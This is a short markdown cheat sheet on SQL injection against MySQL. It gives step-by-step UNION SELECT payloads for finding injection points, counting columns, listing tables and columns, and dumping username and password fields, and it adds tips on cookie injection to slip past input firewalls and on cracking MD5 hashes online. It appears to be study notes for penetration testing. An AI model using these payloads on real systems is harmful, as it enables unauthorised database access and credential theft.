# SQL Injection

## 0X00 Basic Idea

User inputs are executed in database directly.

1. Variables under user control
2. Variables executed in database

## 0x01 Find Injection Point

CORRECT

```
id=1 AND 1=1
id=1 AND '1'=1
```

ERROR

```
id=1' 
id=1 AND 1=2
id=1 AND '1'=2
```

## 0x02 Injection Processes

### Get Table Fields Number

Keep try different value until the largest value without any error.

> UNION SELECT requires the same length of fields, so need to get field number first here.

```
AND 1=1 ORDER BY 10
```

### Get Output Location

```
AND 1=2 UNION SELECT 1,2,3,4,5
```

### Dump Data

#### Table Name

Use tool like SQLMAP to scan table names or manually as following in MySQL.

##### Get Database Version 

```
AND 1=2 UNION SELECT 1,VERSION()
```

##### Get Current Table Schema

```
AND 1=2 UNION SELECT 1,DATABASE()
```

##### Get Table Name 

```
AND 1=2 UNION SELECT 1,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE()
```

> Sometimes may not get the value we want, try with **COUNT()** and **LIMIT x OFFSET y**

#### Get Field Name

```
AND 1=2 UNION SELECT 1,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=DATABASE() AND TABLE_NAME='VALUE FROM LAST STEP'
```

#### Get Field Data

```
AND 1=2 UNION SELECT 1,username,password,'FIELD_NAMES' FROM 'TABLE_NAME'
```

## 0x03 Cookie Injection

To avoid some of the input firewall with [ModHeader][1]

The processes are pretty much same as injecting via url. Only need to replace **SPACE ' '** with **PLUS '+'**. 

## 0x04 MD5

Try decode MD5 from online tools such as [CMD5][2]

[1]: https://mod-header.appspot.com/
[2]: https://www.cmd5.org/